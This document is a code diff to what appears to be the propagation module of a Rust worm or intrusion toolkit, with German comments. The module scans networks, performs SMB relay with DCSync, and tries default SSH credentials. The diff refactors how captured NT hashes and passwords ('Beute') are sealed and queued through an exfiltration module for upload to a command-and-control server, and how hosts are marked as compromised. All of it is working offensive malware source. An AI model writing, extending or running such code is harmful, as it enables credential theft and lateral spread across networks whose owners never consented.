@@ -14,7 +14,7 @@ use kx_core::c2::{self, RegisterRequest, SecretUpload};
 use kx_exploit::{smb_relay_dcsync, try_default_credentials, RelayConfig};
 use kx_scanner::{scan_tcp, DiscoveredHost, ScanResults};
 
-use crate::hostkey::{versiegel, KeySealer};
+use crate::hostkey::KeySealer;
 use tracing::{debug, info, warn};
 
 /// Ergebnis eines Propagationslaufs.
@@ -98,20 +98,21 @@ pub async fn run_propagation(
                     Ok(creds) => {
                         info!("SMB-Relay: {} Credentials erbeutet", creds.len());
                         for c in creds {
-                            let (versiegelt, klartext) = versiegel(&host_schluessel, &c.hash);
-                            results.new_secrets.push(
-                                SecretUpload {
-                                    host_id: host_id.clone(),
-                                    cred_type: "nt_hash".into(),
-                                    username: c.username,
-                                    password: String::new(),
-                                    source: Some("smb_relay".into()),
-                                    master_key: None,
-                                    sealed_password: None,
-                                }
-                                .mit_versiegeltem_passwort(versiegelt)
-                                .mit_passwort(&klartext),
+                            let secret = kx_core::secret::Secret::new(
+                                "nt_hash",
+                                &c.username,
+                                &c.hash,
+                                "smb_relay",
                             );
+                            let upload = kx_core::exfil::ExfiltratedSecret::new(
+                                &secret,
+                                host_schluessel.as_ref().map(|k| k.roh.as_slice()),
+                            )
+                            .upload(&host_id);
+                            match upload {
+                                Ok(upload) => results.new_secrets.push(upload),
+                                Err(e) => warn!("Beute nicht versiegelbar: {e}"),
+                            }
                         }
                         status = c2::STATUS_COMPROMISED.to_string();
                         os = Some("Windows".into());
@@ -123,20 +124,21 @@ pub async fn run_propagation(
             // SSH (22) → Default-Credentials.
             if service == "ssh" {
                 if let Ok(Some(auth)) = try_default_credentials(&host_id, service).await {
-                    let (versiegelt, klartext) = versiegel(&host_schluessel, &auth.password);
-                    results.new_secrets.push(
-                        SecretUpload {
-                            host_id: host_id.clone(),
-                            cred_type: "password".into(),
-                            username: auth.username,
-                            password: String::new(),
-                            source: Some("default_creds".into()),
-                            master_key: None,
-                            sealed_password: None,
-                        }
-                        .mit_versiegeltem_passwort(versiegelt)
-                        .mit_passwort(&klartext),
+                    let secret = kx_core::secret::Secret::new(
+                        "password",
+                        &auth.username,
+                        &auth.password,
+                        "default_creds",
                     );
+                    let upload = kx_core::exfil::ExfiltratedSecret::new(
+                        &secret,
+                        host_schluessel.as_ref().map(|k| k.roh.as_slice()),
+                    )
+                    .upload(&host_id);
+                    match upload {
+                        Ok(upload) => results.new_secrets.push(upload),
+                        Err(e) => warn!("Beute nicht versiegelbar: {e}"),
+                    }
                     status = c2::STATUS_COMPROMISED.to_string();
                 }
             }
